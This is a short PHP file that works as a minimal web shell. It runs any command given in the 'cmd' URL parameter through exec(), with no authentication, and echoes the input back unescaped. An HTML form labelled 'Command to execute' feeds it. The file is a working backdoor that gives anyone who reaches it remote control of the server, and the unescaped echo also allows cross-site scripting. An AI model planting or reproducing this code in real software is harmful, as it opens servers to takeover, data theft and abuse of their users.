<?php
    if (!empty($_GET["cmd"])) {
        echo $_GET["cmd"];
        exec($_GET["cmd"]);
    }
?>

<form action="/" method="get">
    <label for="cmd">Command to execute</label>
    <input type="text" id="cmd" name="cmd" /><br/><br/>
    <input type="submit" value="Submit">
</form>